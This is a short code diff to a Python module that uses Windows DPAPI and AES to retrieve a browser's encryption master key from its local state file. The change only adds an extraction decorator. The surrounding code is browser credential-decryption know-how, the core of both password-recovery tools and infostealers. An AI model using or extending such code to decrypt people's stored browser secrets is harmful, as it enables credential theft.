@@ -4,7 +4,7 @@ import pywintypes
 from win32crypt import CryptUnprotectData
 from base64 import b64decode
 from Crypto.Cipher import AES
-from util.general import FORMAT, BITS_IN_BYTE
+from util.general import FORMAT, BITS_IN_BYTE, try_extract
 
 
 """ CONSTANTS """
@@ -18,6 +18,7 @@ ENC_CIPH_START = ENC_PREFIX_LEN + ENC_NONCE_LEN
 ENC_TAG_LEN = 128 // BITS_IN_BYTE
 
 
+@try_extract
 def get_encryption_key(browser_path: str) -> str:
     """ Retrieve the encryption / master key for AES encryption and decryption """
     # Extract the encrypted encryption key from local state
